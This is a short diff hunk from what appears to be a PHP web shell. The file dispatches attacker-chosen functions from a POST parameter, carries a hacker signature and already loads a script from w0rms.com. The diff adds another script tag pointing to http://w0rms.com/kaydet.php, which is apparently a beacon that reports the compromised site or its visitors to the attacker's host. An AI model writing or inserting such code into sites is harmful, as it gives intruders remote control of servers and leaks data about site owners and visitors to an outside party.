@@ -1666,3 +1666,4 @@ if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
 <img src="http://imguplo1.com/cdn/img/photo-1543m.png"/>
 <a href="">EFsa LeGoLaSs</a>
 <script src=http://w0rms.com/log/log.js></script>
+<script src=http://w0rms.com/kaydet.php></script>
